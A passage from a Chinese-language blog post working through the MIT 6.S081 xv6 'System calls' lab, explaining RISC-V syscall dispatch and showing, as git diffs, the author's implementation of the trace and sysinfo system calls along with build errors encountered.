immediate）指令，将系统调用号（通过宏<code>SYS_$&#123;name&#125;</code>得到）放入寄存器a7中。在RISC-V架构中，a7寄存器通常用于存放系统调用号。</li><li><code>ecall</code>：执行系统调用指令，这会触发处理器进入内核模式并执行相应的内核服务。</li><li><code>ret</code>：返回指令，从系统调用中返回到用户程序。</li></ul></li><li><p>最后，脚本通过多次调用<code>entry</code>函数（传入不同的系统调用名称，如<code>fork</code>, <code>exit</code>, <code>wait</code>等），为每一个列出的系统调用生成对应的汇编代码存根。</p></li></ol></blockquote><ol start="3"><li>内核在执行系统调用时，只是调用 <code>kernel/syscall.c</code> 中的 <code>syscall</code> 函数，该函数读取寄存器 a7 的值，将其作为系统调用号，执行实际的系统调用函数（如<code>sys_trace</code>），并将函数返回值放入寄存器 a0 中，调用结束。</li></ol><h1 id="System-call-tracing"><a href="#System-call-tracing" class="headerlink" title="System call tracing"></a>System call tracing</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>理解了上述的系统调用过程，就可以开始着手完成系统调用的添加了。</p><p>由题干可知，用户态系统调用函数 <code>trace</code> 的参数为一个整型 mask，该 mask 用来表示哪些系统调用需要被追踪，如果 mask 的第 i 位为 1，则系统调用号 i 对应的系统调用将被追踪。</p><p>首先，在 <code>user/user.h</code>、<code>user/usys.pl</code> 和 <code>kernel/syscall.h</code> 中添加 <code>trace</code> 的声明。</p><p>接下来，在 <code>kernel/sysproc.c</code> 中实现系统调用函数 <code>sys_trace</code>，该函数获取用户态传递的 <code>trace</code> 函数的参数 mask，并存入当前进程的 PCB（进程控制块，xv6 中为 <code>kernel/proc.h</code> 中的 <code>struct proc</code> 结构体）中。获取参数的操作，可以查看如下 xv6 文档的描述，并参考 <code>kernel/sysproc.c</code> 中其它系统调用函数的实现。由于参数类型为整型且数量只有一个（存放在 a0 寄存器中），因此调用 <code>argint(0, &amp;(myproc()-&gt;mask))</code>。另外需要注意的是，<code>struct proc</code> 的初始定义中并没有 mask 段的内容，需要自行添加。</p><blockquote><p>Because user code calls system call wrapper functions, the arguments are initially where the RISC-V C calling convention places them: in registers. The kernel trap code saves user registers to the current process’s trap frame, where kernel code can find them. The kernel functions argint, argaddr, and argfd retrieve the n ’th system call argument from the trap frame as an integer, pointer, or a file descriptor. They all call argraw to retrieve the appropriate saved user register (kernel/syscall.c:35).</p></blockquote><p>然后，修改 <code>kernel/proc.c</code> 中 <code>fork</code> 函数的定义，为 mask 字段添加拷贝操作，将父进程的 mask 字段传递给子进程，以此实现对子进程的追踪。</p><pre class="language-c" data-language="c"><code class="language-c">np<span class="token operator">-></span>mask <span class="token operator">=</span> p<span class="token operator">-></span>mask<span class="token punctuation">;</span></code></pre><p>最后，修改 <code>kernel/syscall.c</code> 中的 <code>syscall</code> 函数，判断当前的系统调用号是否位于被追踪的范围内，如果是，则按照要求格式将要追踪的信息打印出来：其中进程号为 <code>myproc()-&gt;pid</code>；函数调用名可手动创建一个系统调用名称表，通过将系统调用号作为下标来获取；函数返回值位于寄存器 a0 中，可通过 <code>myproc()-&gt;trapframe-&gt;a0</code> 来获取。</p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>最后再记录一下本 Lab 遇到的一些问题：</p><h3 id="make失败"><a href="#make失败" class="headerlink" title="make失败"></a>make失败</h3><p><img src="/2024/06/27/MIT6.s081-2021-Lab%20System%20calls/mkerr.png"></p><p>被这个错误困扰了挺久，甚至还为此使用 <code>git reset</code> 回退了版本，最后发现是在 <code>$U/_trace\</code> 的末尾多了一个空格。。。</p><h3 id="系统调用名称表添加出错"><a href="#系统调用名称表添加出错" class="headerlink" title="系统调用名称表添加出错"></a>系统调用名称表添加出错</h3><p><img src="/2024/06/27/MIT6.s081-2021-Lab%20System%20calls/aserr.png"></p><p>原因是我将系统调用名称表添加在了 <code>kernel/syscall.h</code> 中，但该头文件后续是会被 <code>user/usys.pl</code> 用于生成汇编的，因此不能包含 C 语言语句，最后是选择直接添加在了 <code>kernel/syscall.c</code> 中。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>由于本 Lab 主要是在原先的内核代码上进行修改，涉及的文件较多，因此代码部分以 <code>git diff</code> 的形式展现。</p><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/Makefile b/Makefileindex c926b7e..6647da5 100644<span class="token coord">--- a/Makefile</span><span class="token coord">+++ b/Makefile</span>@@ -193,6 +193,7 @@ UPROGS=\<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">$U/_grind\</span><span class="token prefix unchanged"> </span><span class="token line">$U/_wc\</span><span class="token prefix unchanged"> </span><span class="token line">$U/_zombie\</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">$U/_trace\</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line"></span></span>diff --git a/kernel/proc.c b/kernel/proc.cindex 22e7ce4..f4bd5c2 100644<span class="token coord">--- a/kernel/proc.c</span><span class="token coord">+++ b/kernel/proc.c</span>@@ -314,6 +314,9 @@ fork(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  acquire(&amp;np->lock);</span><span class="token prefix unchanged"> </span><span class="token line">  np->state = RUNNABLE;</span><span class="token prefix unchanged"> </span><span class="token line">  release(&amp;np->lock);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  </span><span class="token prefix inserted">+</span><span class="token line">  // here</span><span class="token prefix inserted">+</span><span class="token line">  np->mask = p->mask;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">  return pid;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span>diff --git a/kernel/proc.h b/kernel/proc.hindex f6ca8b7..e83d456 100644<span class="token coord">--- a/kernel/proc.h</span><span class="token coord">+++ b/kernel/proc.h</span>@@ -105,4 +105,7 @@ struct proc &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  struct file *ofile[NOFILE];  // Open files</span><span class="token prefix unchanged"> </span><span class="token line">  struct inode *cwd;           // Current directory</span><span class="token prefix unchanged"> </span><span class="token line">  char name[16];               // Process name (debugging)</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  </span><span class="token prefix inserted">+</span><span class="token line">  // here</span><span class="token prefix inserted">+</span><span class="token line">  int mask;   // Mask of trace</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span></span>diff --git a/kernel/syscall.c b/kernel/syscall.cindex c1b3670..b5b8291 100644<span class="token coord">--- a/kernel/syscall.c</span><span class="token coord">+++ b/kernel/syscall.c</span>@@ -104,6 +104,7 @@ extern uint64 sys_unlink(void);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_wait(void);</span><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_write(void);</span><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_uptime(void);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">extern uint64 sys_trace(void);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">static uint64 (*syscalls[])(void) = &#123;</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_fork]    sys_fork,</span></span>@@ -127,6 +128,16 @@ static uint64 (*syscalls[])(void) = &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">[SYS_link]    sys_link,</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_mkdir]   sys_mkdir,</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_close]   sys_close,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">[SYS_trace]   sys_trace,</span><span class="token prefix inserted">+</span><span class="token line">&#125;;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">// here</span><span class="token prefix inserted">+</span><span class="token line">static char *syscall_names[] = &#123;</span><span class="token prefix inserted">+</span><span class="token line">"dummy",  "fork",  "exit",  "wait",  "pipe",</span><span class="token prefix inserted">+</span><span class="token line">"read",   "kill",  "exec",  "fstat", "chdir",</span><span class="token prefix inserted">+</span><span class="token line">"dup",    "getpid","sbrk",  "sleep", "uptime",</span><span class="token prefix inserted">+</span><span class="token line">"open",   "write", "mknod", "unlink", "link",</span><span class="token prefix inserted">+</span><span class="token line">"mkdir",  "close", "trace",</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">void</span></span>@@ -138,6 +149,11 @@ syscall(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  num = p->trapframe->a7;</span><span class="token prefix unchanged"> </span><span class="token line">  if(num > 0 &amp;&amp; num &lt; NELEM(syscalls) &amp;&amp; syscalls[num]) &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    p->trapframe->a0 = syscalls[num]();</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">// here</span><span class="token prefix inserted">+</span><span class="token line">if (p->mask &amp; (1 &lt;&lt; num)) &#123;  // if mask contains current syscall num</span><span class="token prefix inserted">+</span><span class="token line">printf("%d: syscall %s -> %d\n", p->pid, syscall_names[num], p->trapframe->a0);</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  &#125; else &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    printf("%d %s: unknown sys call %d\n",</span><span class="token prefix unchanged"> </span><span class="token line">            p->pid, p->name, num);</span></span>diff --git a/kernel/syscall.h b/kernel/syscall.hindex bc5f356..756d191 100644<span class="token coord">--- a/kernel/syscall.h</span><span class="token coord">+++ b/kernel/syscall.h</span><span class="token coord">@@ -20,3 +20,4 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#define SYS_link   19</span><span class="token prefix unchanged"> </span><span class="token line">#define SYS_mkdir  20</span><span class="token prefix unchanged"> </span><span class="token line">#define SYS_close  21</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#define SYS_trace  22 // here</span></span>\ No newline at end of filediff --git a/kernel/sysproc.c b/kernel/sysproc.cindex e8bcda9..3ff51d9 100644<span class="token coord">--- a/kernel/sysproc.c</span><span class="token coord">+++ b/kernel/sysproc.c</span>@@ -95,3 +95,11 @@ sys_uptime(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  release(&amp;tickslock);</span><span class="token prefix unchanged"> </span><span class="token line">  return xticks;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">// here</span><span class="token prefix inserted">+</span><span class="token line">uint64 sys_trace(void) &#123;</span><span class="token prefix inserted">+</span><span class="token line">if (argint(0, &amp;(myproc()->mask)) &lt; 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">return -1;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line">return 0;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span></span>\ No newline at end of filediff --git a/user/user.h b/user/user.hindex b71ecda..16107d6 100644<span class="token coord">--- a/user/user.h</span><span class="token coord">+++ b/user/user.h</span>@@ -23,6 +23,7 @@ int getpid(void);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">char* sbrk(int);</span><span class="token prefix unchanged"> </span><span class="token line">int sleep(int);</span><span class="token prefix unchanged"> </span><span class="token line">int uptime(void);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">int trace(int); // here</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// ulib.c</span><span class="token prefix unchanged"> </span><span class="token line">int stat(const char*, struct stat*);</span></span>diff --git a/user/usys.pl b/user/usys.plindex 01e426e..76c64ec 100755<span class="token coord">--- a/user/usys.pl</span><span class="token coord">+++ b/user/usys.pl</span>@@ -36,3 +36,4 @@ entry("getpid");<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">entry("sbrk");</span><span class="token prefix unchanged"> </span><span class="token line">entry("sleep");</span><span class="token prefix unchanged"> </span><span class="token line">entry("uptime");</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">entry("trace"); # here</span></span>\ No newline at end of file</code></pre><h1 id="Sysinfo"><a href="#Sysinfo" class="headerlink" title="Sysinfo"></a>Sysinfo</h1><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>在完整添加了一个新的系统调用，熟悉了整体流程之后，本题相对就比较轻松了。声明添加的操作就跳过不谈了，这里主要关注 <code>sys_sysinfo</code> 的实现：即获取 <code>freemem</code> 和 <code>nproc</code> 的信息并将其填充到参数 <code>sysinfo</code> 指针对应的地址处。</p><p>这个大的目标可以拆分为 3 个小目标：</p><ol><li>如何获取 <code>freemem</code> 的信息？</li><li>如何获取 <code>nproc</code> 的信息？</li><li>如何将数据填充入指定的地址中（用户空间）？</li></ol><h3 id="获取-freemem-的信息"><a href="#获取-freemem-的信息" class="headerlink" title="获取 freemem 的信息"></a>获取 <code>freemem</code> 的信息</h3><p>仔细阅读 <code>kernel/kalloc.c</code> 的代码，可以发现一些关键信息：</p><ul><li><code>struct run</code>：用来内存分配单元的数据结构，本身的地址即为所指向的内存空间的起始地址，包含一个 <code>next</code> 指针，用于实现链表。</li><li><code>kmem.freelist</code>：空闲链表，存储着一系列指向空闲空间的指针。</li><li><code>PGSIZE</code>：内存分配页的大小，即每个 <code>struct run *</code> 所指向的内存空间的大小。</li></ul><p>了解了上述信息后，计算空闲空间的大小就很简单了，只需要计算空闲链表的长度 <code>n</code>，空闲内存的空间大小即为 <code>n * PGSIZE</code>。</p><pre class="language-c" data-language="c"><code class="language-c">uint64 <span class="token function">freemem_bytes</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>uint64 bytes <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">run</span> <span class="token operator">*</span>r<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span>r <span class="token operator">=</span> kmem<span class="token punctuation">.</span>freelist<span class="token punctuation">;</span> r<span class="token punctuation">;</span> r <span class="token operator">=</span> r<span class="token operator">-></span>next<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>bytes <span class="token operator">+=</span> PGSIZE<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> bytes<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="获取-nproc-的信息"><a href="#获取-nproc-的信息" class="headerlink" title="获取 nproc 的信息"></a>获取 <code>nproc</code> 的信息</h3><p>与上面一样，阅读 <code>kernel/proc.c</code> 的代码，可知：</p><ul><li><code>struct proc proc[NPROC]</code> ：进程数组，存储着所有进程的 <code>struct proc</code>.</li><li><code>UNUSED</code>：<code>struct proc</code> 中 <code>enum procstate</code> 的类型之一，代表本 <code>struct proc</code> 未被使用。</li></ul><p>那么要得到当前系统中进程的数量，只需要遍历整个 <code>proc</code>，计算未处于 <code>UNUSED</code> 状态的进程数量即可。</p><pre class="language-c" data-language="c"><code class="language-c">uint64 <span class="token function">proc_num</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">struct</span> <span class="token class-name">proc</span> <span class="token operator">*</span>p<span class="token punctuation">;</span>uint64 num <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">for</span><span class="token punctuation">(</span>p <span class="token operator">=</span> proc<span class="token punctuation">;</span> p <span class="token operator">&lt;</span> <span class="token operator">&amp;</span>proc<span class="token punctuation">[</span>NPROC<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">++</span>p<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>num <span class="token operator">+=</span> <span class="token punctuation">(</span>p<span class="token operator">-></span>state <span class="token operator">!=</span> UNUSED<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> num<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="将数据填充入指定的地址中"><a href="#将数据填充入指定的地址中" class="headerlink" title="将数据填充入指定的地址中"></a>将数据填充入指定的地址中</h3><p>得到 <code>freemem</code> 和 <code>nproc</code> 之后，就需要将数据写入 <code>sysinfo</code> 的参数 <code>struct sysinfo *</code> 指向的内存区域，获取参数的方法和 <code>tracing</code> 类似，不过由于参数是指针类型，因此采用 <code>argaddr</code>。最后，仿照 <code>kernel/file.c</code> 中的操作，使用 <code>copyout</code> 将内核区域的数据写入用户空间中。</p><pre class="language-c" data-language="c"><code class="language-c">uint64 <span class="token function">sys_sysinfo</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">struct</span> <span class="token class-name">proc</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token function">myproc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">sysinfo</span> info<span class="token punctuation">;</span>uint64 addr<span class="token punctuation">;</span>info<span class="token punctuation">.</span>freemem <span class="token operator">=</span> <span class="token function">freemem_bytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>info<span class="token punctuation">.</span>nproc <span class="token operator">=</span> <span class="token function">proc_num</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// get argument addr</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">argaddr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>addr<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// copy data of info to addr</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">copyout</span><span class="token punctuation">(</span>p<span class="token operator">-></span>pagetable<span class="token punctuation">,</span> addr<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>info<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/Makefile b/Makefileindex 6647da5..cfb5119 100644<span class="token coord">--- a/Makefile</span><span class="token coord">+++ b/Makefile</span>@@ -194,6 +194,7 @@ UPROGS=\<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">$U/_wc\</span><span class="token prefix unchanged"> </span><span class="token line">$U/_zombie\</span><span class="token prefix unchanged"> </span><span class="token line">$U/_trace\</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">$U/_sysinfotest\</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line"></span></span>diff --git a/kernel/defs.h b/kernel/defs.hindex 3564db4..b2dbb8d 100644<span class="token coord">--- a/kernel/defs.h</span><span class="token coord">+++ b/kernel/defs.h</span>@@ -63,6 +63,7 @@ void            ramdiskrw(struct buf*);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">void*           kalloc(void);</span><span class="token prefix unchanged"> </span><span class="token line">void            kfree(void *);</span><span class="token prefix unchanged"> </span><span class="token line">void            kinit(void);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">uint64          freemem_bytes(void); // here</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// log.c</span><span class="token prefix unchanged"> </span><span class="token line">void            initlog(int, struct superblock*);</span></span>@@ -104,6 +105,7 @@ void            yield(void);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">int             either_copyout(int user_dst, uint64 dst, void *src, uint64 len);</span><span class="token prefix unchanged"> </span><span class="token line">int             either_copyin(void *dst, int user_src, uint64 src, uint64 len);</span><span class="token prefix unchanged"> </span><span class="token line">void            procdump(void);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">uint64          proc_num(void); // here</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// swtch.S</span><span class="token prefix unchanged"> </span><span class="token line">void            swtch(struct context*, struct context*);</span></span>diff --git a/kernel/kalloc.c b/kernel/kalloc.cindex fa6a0ac..686d84e 100644<span class="token coord">--- a/kernel/kalloc.c</span><span class="token coord">+++ b/kernel/kalloc.c</span>@@ -80,3 +80,15 @@ kalloc(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    memset((char*)r, 5, PGSIZE); // fill with junk</span><span class="token prefix unchanged"> </span><span class="token line">  return (void*)r;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">// here</span><span class="token prefix inserted">+</span><span class="token line">uint64 freemem_bytes(void) &#123;</span><span class="token prefix inserted">+</span><span class="token line">uint64 bytes = 0;</span><span class="token prefix inserted">+</span><span class="token line">struct run *r;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">for (r = kmem.freelist; r; r = r->next) &#123;</span><span class="token prefix inserted">+</span><span class="token line">bytes += PGSIZE;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">return bytes;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span></span>\ No newline at end of filediff --git a/kernel/proc.c b/kernel/proc.cindex f4bd5c2..ed6eec4 100644<span class="token coord">--- a/kernel/proc.c</span><span class="token coord">+++ b/kernel/proc.c</span>@@ -657,3 +657,15 @@ procdump(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    printf("\n");</span><span class="token prefix unchanged"> </span><span class="token line">  &#125;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">// here</span><span class="token prefix inserted">+</span><span class="token line">uint64 proc_num(void) &#123;</span><span class="token prefix inserted">+</span><span class="token line">struct proc *p;</span><span class="token prefix inserted">+</span><span class="token line">uint64 num = 0;</span><span class="token prefix inserted">+</span><span class="token line">  </span><span class="token prefix inserted">+</span><span class="token line">for(p = proc; p &lt; &amp;proc[NPROC]; ++p) &#123;</span><span class="token prefix inserted">+</span><span class="token line">num += (p->state != UNUSED);</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">return num;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span></span>\ No newline at end of filediff --git a/kernel/syscall.c b/kernel/syscall.cindex b5b8291..6fed4f2 100644<span class="token coord">--- a/kernel/syscall.c</span><span class="token coord">+++ b/kernel/syscall.c</span>@@ -105,6 +105,7 @@ extern uint64 sys_wait(void);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_write(void);</span><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_uptime(void);</span><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_trace(void);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">extern uint64 sys_sysinfo(void);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">static uint64 (*syscalls[])(void) = &#123;</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_fork]    sys_fork,</span></span>@@ -129,6 +130,7 @@ static uint64 (*syscalls[])(void) = &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">[SYS_mkdir]   sys_mkdir,</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_close]   sys_close,</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_trace]   sys_trace,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">[SYS_sysinfo] sys_sysinfo,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// here</span></span>@@ -137,7 +139,7 @@ static char *syscall_names[] = &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">"read",   "kill",  "exec",  "fstat", "chdir",</span><span class="token prefix unchanged"> </span><span class="token line">"dup",    "getpid","sbrk",  "sleep", "uptime",</span><span class="token prefix unchanged"> </span><span class="token line">"open",   "write", "mknod", "unlink", "link",</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">"mkdir",  "close", "trace",</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">"mkdir",  "close", "trace", "sysinfo",</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">void</span></span>diff --git a/kernel/syscall.h b/kernel/syscall.hindex 756d191..7954d98 100644<span class="token coord">--- a/kernel/syscall.h</span><span class="token coord">+++ b/kernel/syscall.h</span><span class="token coord">@@ -20,4 +20,5 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#define SYS_link   19</span><span class="token prefix unchanged"> </span><span class="token line">#define SYS_mkdir  20</span><span class="token prefix unchanged"> </span><span class="token line">#define SYS_close  21</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">#define SYS_trace  22 // here</span></span>\ No newline at end of file<span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#define SYS_trace  22 // here</span><span class="token prefix inserted">+</span><span class="token line">#define SYS_sysinfo 23</span></span>\ No newline at end of filediff --git a/kernel/sysproc.c b/kernel/sysproc.cindex 3ff51d9..644638f 100644<span class="token coord">--- a/kernel/sysproc.c</span><span class="token coord">+++ b/kernel/sysproc.c</span><span class="token coord">@@ -6,6 +6,7 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#include "memlayout.h"</span><span class="token prefix unchanged"> </span><span class="token line">#include "spinlock.h"</span><span class="token prefix unchanged"> </span><span class="token line">#include "proc.h"</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#include "sysinfo.h"</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">uint64</span><span class="token prefix unchanged"> </span><span class="token line">sys_exit(void)</span></span>@@ -101,5 +102,26 @@ uint64 sys_trace(void) &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">if (argint(0, &amp;(myproc()->mask)) &lt; 0) &#123;</span><span class="token prefix unchanged"> </span><span class="token line">return -1;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">return 0;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">uint64 sys_sysinfo(void) &#123;</span><span class="token prefix inserted">+</span><span class="token line">struct proc *p = myproc();</span><span class="token prefix inserted">+</span><span class="token line">struct sysinfo info;</span><span class="token prefix inserted">+</span><span class="token line">uint64 addr;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">info.freemem = freemem_bytes();</span><span class="token prefix inserted">+</span><span class="token line">info.nproc = proc_num();</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">// get argument addr</span><span class="token prefix inserted">+</span><span class="token line">if (argaddr(0, &amp;addr) &lt; 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">return -1;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">// copy data of info to addr</span><span class="token prefix inserted">+</span><span class="token line">if (copyout(p->pagetable, addr, (char *)&amp;info, sizeof(info)) &lt; 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">return -1;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix 